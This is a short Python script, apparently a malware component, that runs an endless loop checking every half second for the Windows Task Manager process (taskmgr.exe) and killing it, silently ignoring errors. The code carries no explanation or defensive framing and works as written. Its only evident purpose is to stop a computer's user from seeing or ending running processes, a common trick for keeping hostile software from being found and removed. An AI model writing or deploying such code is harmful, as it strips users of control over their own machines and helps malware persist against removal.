import psutil
import time

def check_task_manager():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'taskmgr.exe':
            return proc.pid  
    return None

while True:
    taskmgr_pid = check_task_manager()
    if taskmgr_pid:
        try:
            taskmgr_process = psutil.Process(taskmgr_pid)
            taskmgr_process.terminate()  
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass                      
    time.sleep(0.5)
